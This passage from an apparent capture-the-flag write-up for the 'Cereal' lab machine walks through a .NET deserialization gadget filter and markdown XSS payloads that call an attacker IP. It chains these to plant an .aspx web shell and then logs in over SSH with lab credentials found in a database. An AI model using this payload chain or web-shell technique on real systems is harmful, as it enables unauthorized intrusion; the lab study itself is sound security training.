</span></span><span class="line"><span class="cl">                    <span class="n">TypeNameHandling</span> <span class="p">=</span> <span class="n">TypeNameHandling</span><span class="p">.</span><span class="n">Auto</span>
</span></span><span class="line"><span class="cl">                <span class="p">});</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">Ok</span><span class="p">(</span><span class="n">cereal</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></div><p>The <code>Get</code> function can only be accessed if the request IP is in the whitelist (defined in <code>appsettings.json</code> ) and it takes one parameter called <code>id</code> (GET <code>/requests/{id}</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="na">[Authorize(Policy = &#34;RestrictIP&#34;)]</span>
</span></span><span class="line"><span class="cl"><span class="na">[HttpGet(&#34;{id}&#34;)]</span>
</span></span></code></pre></div><p>This line blocks the gadget classes used for .NET deserialization attack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span>json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;objectdataprovider&#34;</span><span class="o">)</span> <span class="o">||</span> json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;windowsidentity&#34;</span><span class="o">)</span> <span class="o">||</span> json.ToLower<span class="o">()</span>.Contains<span class="o">(</span><span class="s2">&#34;system&#34;</span><span class="o">))</span>
</span></span></code></pre></div><p>But, there is a class called <code>DownloadHelper</code> that has a function which can be used to send a download request:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">class</span> <span class="nc">DownloadHelper</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="n">String</span> <span class="n">_URL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="n">String</span> <span class="n">_FilePath</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="n">String</span> <span class="n">URL</span>
</span></span><span class="line"><span class="cl"><span class="p">...&lt;</span><span class="n">SNIP</span><span class="p">&gt;...</span>
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="k">void</span> <span class="n">Download</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">using</span> <span class="p">(</span><span class="n">WebClient</span> <span class="n">wc</span> <span class="p">=</span> <span class="k">new</span> <span class="n">WebClient</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(!</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">_URL</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">_FilePath</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">wc</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="n">_URL</span><span class="p">,</span> <span class="n">ReplaceLastOccurrence</span><span class="p">(</span><span class="n">_FilePath</span><span class="p">,</span><span class="s">&#34;\\&#34;</span><span class="p">,</span> <span class="s">&#34;\\21098374243-&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></div><p>I could use <code>DownloadHelper</code> class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.</p>
<p>The problem here I couldn&rsquo;t make a GET request to <code>requests/{id}</code>  because there is an IP restriction policy.</p>
<h4 id="xss-vulnerability">XSS Vulnerability</h4>
<p>When tracking down where the previous GET request came from, I found out that each Cereal Request sent lands on the admin page (<code>AdminPage.jsx</code>).</p>
<p><div class="img-container"><img src="imgs/image-20210609114906150.png" alt="image-20210609114906150"  /></div>
</p>
<p>And one of the app library used in the admin page called <code>react-marked-down</code> has an <a href="https://hackerone.com/reports/344069">XSS vulnerability</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">Accordion</span><span class="p">.</span><span class="nx">Toggle</span> <span class="nx">as</span><span class="o">=</span><span class="p">{</span><span class="nx">Button</span><span class="p">}</span> <span class="nx">variant</span><span class="o">=</span><span class="s2">&#34;link&#34;</span> <span class="nx">eventKey</span><span class="o">=</span><span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">requestId</span><span class="p">}</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;expand&#34;</span> <span class="nx">id</span><span class="o">=</span><span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">props</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">requestId</span><span class="p">}</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="nx">requestData</span> <span class="o">&amp;&amp;</span> <span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span> <span class="o">==</span> <span class="s1">&#39;string&#39;</span> <span class="o">&amp;&amp;</span> 
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">MarkdownPreview</span> <span class="nx">markedOptions</span><span class="o">=</span><span class="p">{{</span> <span class="nx">sanitize</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}}</span> <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">requestData</span><span class="p">.</span><span class="nx">title</span><span class="p">}</span> <span class="o">/&gt;</span> <span class="c1">// &lt;==
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">...</span><span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span><span class="p">...</span>
</span></span></code></pre></div><p>I could confirm the vulnerability with the following payload:</p>
<pre tabindex="0"><code>[XSS](javascript: document.write`&lt;img src=&#39;http://10.10.14.3/iamf&#39;/&gt;`)
</code></pre><p><div class="img-container"><img src="imgs/image-20210605212246743.png" alt="image-20210605212246743"  /></div>
</p>
<p>With a few experiments, URL encoding seems to work as well</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">[<span class="nt">XSS</span>](<span class="na">javascript: document.write%28%22&lt;img src=&#39;http://10.10.14.3/iamf&#39;&gt;%22%29</span>)
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-sonny">Shell as Sonny</h3>
<h4 id="web-shell-upload-via-xss-and-deserialization">Web Shell Upload via XSS and Deserialization</h4>
<p>Putting it all together:</p>
<ul>
<li>There is an uploads directory at <code>https://source.cereal.htb/uploads/</code>.</li>
<li>The gadget classes for deserialization attack are filtered, but there is one class called <code>DownloadHelper</code> that can be accessed and it has a download function.</li>
<li>There is a SSRF (not sure yet) in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction.</li>
</ul>
<p>The tactics:</p>
<ul>
<li><a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=25">Serialized</a> <code>DownloadHelper</code> class which contains a web shell URL that points to the attacking machine, and send it via the Cereal Request, note the ID.</li>
<li>Use XSS which bypasses the IP restriction, to make a GET request to <code>cereal.htb/request/{the ID}</code> to trigger the deserialization,</li>
<li>Confirms the web shell at <code>https://cereal.source.htb/uploads/shell-name.aspx</code></li>
</ul>
<p>I&rsquo;ve made a <a href="https://gist.github.com/fahmifj/c935b12c4b0a66ee30a7aa825d3c7fe1">script</a> to chain these vulnerabilities (XSS, SSRF, and Deserialization). The results is as follow:</p>
<p><div class="img-container"><img src="imgs/image-20210609125605658.png" alt="image-20210609125605658"  /></div>
</p>
<blockquote>
<p>That&rsquo;s on different IP because I decided to ran the exploit again to make sure it&rsquo;s still work XD</p>
</blockquote>
<p>I can access my web shell on <code>http://source.cereal.htb/uploads/iamf.aspx</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210609125710180.png" alt="image-20210609125710180"  /></div>
</p>
<h4 id="ssh---sonny">SSH - sonny</h4>
<p>A quick check on the web directory, I find the <code>cereal.db</code> at <code>c:\inetpub\cereal\db\cereal.db</code> and it contains a string that looks like a set of credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210609133307066.png" alt="image-20210609133307066"  /></div>
</p>
<p>I tried it on SSH (<code>sonny:mutual.madden.manner38974</code>) and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.2» 
</span></span><span class="line"><span class="cl">$ ssh sonny@cereal.htb
</span></span><span class="line"><span class="cl">sonny@cereal.htb<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17763.1817<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sonny@CEREAL C:<span class="se">\U</span>sers<span class="se">\s</span>onny&gt;dir desktop<span class="se">\ </span>
</span></span><span class="line"><span class="cl"> Volume in drive C has no label.                   
</span></span><span class="line"><span class="cl"> Volume Serial Number is C4EF-2153                 
</span></span><span class="line"><span class="cl">                                                   
</span></span><span class="line"><span class="cl"> Directory of C:<span class="se">\U</span>sers<span class="se">\s</span>onny<span class="se">\d</span>esktop               
</span></span><span class="line"><span class="cl">                                                   
</span></span><span class="line"><span class="cl">11/16/2020  05:19 AM    &lt;DIR&gt;          .           
</span></span><span class="line"><span class="cl">11/16/2020  05:19 AM    &lt;DIR&gt;          ..          
</span></span><span class="line"><span class="cl">06/07/2021  09:59 PM                <span class="m">34</span> user.txt    
</span></span><span class="line"><span class="cl">               <span class="m">1</span> File<span class="o">(</span>s<span class="o">)</span>             <span class="m">34</span> bytes      
</span></span><span class="line"><span class="cl">               <span class="m">2</span> Dir<span class="o">(</span>s<span class="o">)</span>   7,621,619,712 bytes free 
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
